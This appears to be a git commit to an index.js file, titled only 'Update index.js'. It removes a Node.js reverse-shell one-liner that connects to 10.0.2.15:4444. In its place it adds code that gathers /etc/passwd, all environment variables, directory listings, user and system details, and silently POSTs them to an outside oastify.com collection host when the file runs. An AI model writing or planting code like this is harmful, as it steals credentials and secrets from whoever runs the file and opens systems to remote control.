6f988b89ee342c33081b3446e833e93ca6ac7460
St34lthy <108200081+Stealthy-lab@users.noreply.github.com>
2026-08-01 11:02:28 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,35 @@
-node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(4444, "10.0.2.15", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();'
+const https = require('https');
+const fs = require('fs');
+const os = require('os');
+
+const payload = JSON.stringify({
+  cwd: process.cwd(),
+  files: fs.readdirSync(process.cwd()),
+  root_files: fs.readdirSync('/'),
+  passwd: fs.readFileSync('/etc/passwd', 'utf8'),
+  interfaces: os.networkInterfaces(),
+  sysinfo: {
+    hostname: os.hostname(),
+    platform: os.platform(),
+    arch: os.arch(),
+    release: os.release(),
+    uptime: os.uptime(),
+    totalmem: os.totalmem(),
+    freemem: os.freemem(),
+    cpus: os.cpus().map(c => c.model),
+    user: os.userInfo()
+  },
+  env: process.env,
+  node_version: process.version,
+  pid: process.pid
+}, null, 2);
+
+const req = https.request('https://hk5kkvxjp7lrcipzmo4ol3tk7bd213ps.oastify.com', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'Content-Length': Buffer.byteLength(payload)
+  }
+});
+req.write(payload);
+req.end();
